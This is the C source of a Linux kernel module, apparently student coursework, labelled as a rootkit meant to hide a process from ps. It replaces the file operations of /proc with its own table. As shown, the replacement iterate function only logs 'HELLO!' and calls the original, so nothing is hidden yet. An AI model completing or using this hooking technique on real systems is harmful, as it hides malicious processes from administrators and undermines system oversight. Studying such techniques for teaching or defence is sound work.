#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/fs.h>


MODULE_DESCRIPTION("Cache un processus, pour la commande ps");
MODULE_AUTHOR("Ilyas Toumlilt, M2 SAR, UPMC");
MODULE_LICENSE("GPL");

static struct file *root_filp;
static struct file_operations *proc_root_fops;
static struct file_operations my_fops;

static int my_iterate(struct file *fp, struct dir_context *ctx)
{
        pr_info("HELLO!\n");
        return proc_root_fops->iterate(fp, ctx);
}

static int ps_rootkit_init(void)
{
        root_filp = filp_open("/proc", O_RDONLY, 0);

        pr_info("INFOps: %p; count=%d\n",
                (void*)root_filp,
                (int)root_filp->f_count.counter);

        /* remarque: la struct fops du /root est une const ! */
        /* je sauvegarde l'ancienne fops du /root */
        proc_root_fops = root_filp->f_op;

        /* je crée la mienne */
        my_fops.read = proc_root_fops->read;
        my_fops.iterate = my_iterate;
        my_fops.llseek = proc_root_fops->llseek;

        /* et je l'affecte en f_op du /root */
        root_filp->f_op = &my_fops;

        pr_info("ps_rootkit: module inserted.\n");
        return 0;
}
module_init(ps_rootkit_init);

static void ps_rootkit_exit(void)
{
        //filp_close(root_filp, NULL);

        /* je remets les fops par défaut du /root */
        root_filp->f_op = proc_root_fops;
        
        pr_info("ps_rootkit: module exited.\n");
}
module_exit(ps_rootkit_exit);
